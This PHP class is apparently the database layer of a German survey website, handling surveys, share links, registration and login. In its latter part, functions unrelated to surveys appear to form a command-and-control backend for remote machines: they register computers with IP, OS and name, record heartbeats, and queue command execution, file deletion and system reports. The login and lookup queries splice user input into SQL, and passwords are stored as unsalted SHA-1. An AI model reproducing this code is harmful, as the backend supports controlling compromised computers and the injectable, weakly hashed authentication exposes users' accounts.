<?php

class Querys extends Functions {

	
	public function createUmfrage($post){
		
		$umfrage_id = $this->addSurvey($_SESSION['userid'], $post['titel'], $post['beschreibung']);
		
		foreach ($post as $key => $value){
			if(preg_match("/^(frage_)([0-9]+)$/", $key)) {
				$this->addQuestion($umfrage_id, $value);
			}
		}
		$this->addLink($umfrage_id);

		$this->alertSuccess("Umfrage wurde erfolgreich erstellt.");
	}
	
	public function addSurvey($user_id, $titel, $beschreibung){
		return $this->insertDbAndGetLast("INSERT INTO umfragen (`fk_user`, `titel`, `beschreibung`) VALUES (:fk_user, :titel, :beschreibung)", array(
				 array(':fk_user', $user_id, PDO::PARAM_INT), array(':titel', $titel, PDO::PARAM_STR), array(':beschreibung', $beschreibung, PDO::PARAM_STR)
		));	
		
	}
	
	public function addQuestion($survey_id, $question){
		$this->insertDb("INSERT INTO fragen (`fk_umfrage`, `frage`) VALUES (:fk_umfrage, :question)", array(
			array(':fk_umfrage', $survey_id, PDO::PARAM_INT), array(':question', $question, PDO::PARAM_STR)	
		));
	}
	
	public function addLink($survey_id){
		$this->insertDb("INSERT INTO links (`fk_umfrage`, `hash`) VALUES (:fk_umfrage, :hash)", array(
				array(':fk_umfrage', $survey_id, PDO::PARAM_STR), array(':hash', sha1($survey_id . date("d-m-Y H:i:s")), PDO::PARAM_STR)
		));
	}
	
	public function getCreatedSurveysFromUser($user_id){
		 return $this->getArrayAssoc("SELECT a.id, a.titel, l.hash FROM umfragen as a inner join links as l on a.id = l.fk_umfrage  WHERE `fk_user` =:user_id", array(
		 		array(':user_id', $user_id, PDO::PARAM_INT)
		 ));
	}
	
	public function getSurveyByHash($hash){
		return $this->getColumn("SELECT u.id, u.titel,u.beschreibung, u.erstell_datum, l.hash FROM umfragen AS u INNER JOIN links AS l ON u.id = l.fk_umfrage WHERE l.hash =:hash", array(
				array(':hash', $hash, PDO::PARAM_STR)
		));
	}
	
	
	
	public function registerUser($post){
		
		$password = $this->make_safe(sha1($post['password']));
		$password2 = $this->make_safe(sha1($post['password2']));
		$geburtstag = $this->make_safe($post['tag'].'.'.$post['monat'].'.'.$post['jahr']);

		if($password == $password2 && !$this->emailExists($post['email'])){
			
		
			$insert = $this->insertDb("INSERT INTO `users` (`id`, `name`, `email`, `password`, `geschlecht`, `geburtstag`) VALUES (NULL, :name, :email, :pw, :geschlecht, :geburtstag)", array(
					array(':name', $post['name'], PDO::PARAM_STR), array(':email', $post['email'], PDO::PARAM_STR), array(':pw', $password, PDO::PARAM_STR), array(':geschlecht', $post['geschlecht'], PDO::PARAM_STR), array(':geburtstag', $geburtstag, PDO::PARAM_STR)
			));
				
			
			$this->alertSuccess("Erfolgreich registriert.</div>");
				
			header("Location: " . $this->_config['basepath']."/login");
		} else {
			$this->alertError("Bite &uuml;berpr&uuml;fen Sie ihre Angaben.");
		}
		
		

		/*
		
		
		$test = $this->fetch_assoc("Select * from users", array());
		
		var_dump($test);
		
		
		
		$name = $this->make_safe($post['name']);
		$email = $this->make_safe($post['email']);
		$password = $this->make_safe(sha1($post['password']));
		$password2 = $this->make_safe(sha1($post['password2']));
		$geschlecht = $this->make_safe($post['geschlecht']);
		$geburtstag = $this->make_safe($post['tag'].'.'.$post['monat'].'.'.$post['jahr']);
		
		if($password == $password2 && !$this->emailExists($email)){
			$this->db_assoc("INSERT INTO `users` (`id`, `name`, `email`, `password`, `geschlecht`, `geburtstag`) VALUES (NULL, '$name', '$email', '$password', '$geschlecht', '$geburtstag')");

			$this->alertSuccess("Erfolgreich registriert.</div>");
			
			header("Location: " . $this->_config['basepath']."/login");
		} else {
			$this->alertError("Bite &uuml;berpr&uuml;fen Sie ihre Angaben.");
		}
		*/
	}
	
	public function log($userId, $log){
		$this->insertDb("INSERT INTO `log` (`fk_user`, `log`) VALUES (:user_id, :log)", array(
				array(':user_id', $userId, PDO::PARAM_STR), array(':log', $log, PDO::PARAM_STR)
		));
	}
	
	public function loginUser($post){
		$email = $this->make_safe($post['email']);
		$password = $this->make_safe(sha1($post['password']));
		$i = $this->get_query_count("SELECT id FROM `users` WHERE `email` = '$email' AND `password` = '$password'");
		if($i == 1){
			
			$this->alertSuccess("Erfolgreich eingeloggt.");
			
			$_SESSION['userid'] = $this->getUserIdByEmail($email);
			
			$this->log($_SESSION['userid'], "login");
			
			header("Location: " . $this->_config['basepath']."/surveys");
		} else {
			$this->alertError("Bite &uuml;berpr&uuml;fen Sie ihre Angaben.");
		}
		
	}
	
	public function getCurrentUser($id){
		return $this->db_assoc("SELECT * FROM `users` WHERE `id` = '$id'");
	}
	
	public function getUserIdByEmail($email){
		$email = $this->make_safe($email);
		return $this->get_column("SELECT id FROM `users` WHERE `email` = '$email'");
	}
	
	public function emailExists($email){
		$email = $this->make_safe($email);
		$i = $this->get_query_count("SELECT id FROM `users` WHERE `email` = '$email'");
		return ($i >= 1 ? true : false);
	}
	
	
	//ASDASSSSSSSSSSSSSSSSSSS
	
	public function whatToExexute($uid){
		$uid = $this->make_safe($uid);
		$i = $this->db_assoc("SELECT ex_commands, del_files, report_system FROM execute WHERE fk_uid = '$uid'");
		return json_encode($i);
	}

	public function newComputer($uid){
		$uid = $this->make_safe($uid);
		$this->addComputer($uid, 'N/A', 'N/A');
		$this->db_assoc("INSERT INTO execute (id, fk_uid, ex_commands, del_files, report_system) VALUES (NULL, '$uid', '0', '0', '1')");
	}

	public function updateExecute(){
		//UPDATE execute` SET ex_commands = '1', dl_files = '1', report_system = '0' WHERE id =1;
	}

	public function computerExists($uid){
		$uid = $this->make_safe($uid);
		$i = $this->get_query_count("SELECT id FROM computers WHERE uid = '$uid'");
		return ($i == 1 ? true : false);
	}


	public function isSomethingToEx($uid){
		$uid = $this->make_safe($uid);
		$i = $this->get_query_count("SELECT * FROM execute WHERE fk_uid = '$uid' AND ex_commands =1 OR dl_files =1 OR report_system =1");
		return ($i == 1 ? true : false);
	}

	public function addComputer($uid, $os, $pcname){
		$ip = $_SERVER["REMOTE_ADDR"];
		$uid = $this->make_safe($uid);
		$os = $this->make_safe($os);
		$pcname = $this->make_safe($pcname);
			
		$computer = $this->db_assoc("INSERT INTO computers (id, uid, ip, os, name, date) VALUES (NULL, '$uid', '$ip', '$os', '$pcname', CURRENT_TIMESTAMP)");
	}

	public function liveBit($uid){
		$ip = $_SERVER["REMOTE_ADDR"];
		$uid = $this->make_safe($uid);
			
		$computer = $this->db_assoc("INSERT INTO ping (id, uid, ip, date) VALUES (NULL, '$uid', '$ip', CURRENT_TIMESTAMP)");
	}

	public function addFile($path, $name){
		$file = $this->db_assoc("INSERT INTO files (id, name, path, date) VALUES (NULL, '$name', '$path', CURRENT_TIMESTAMP)");
	}

	//
	
	
	
	
	
	
	
	
	
	public function make_safe($variable){
		return strip_tags(trim(stripslashes($variable)));
	}
		


}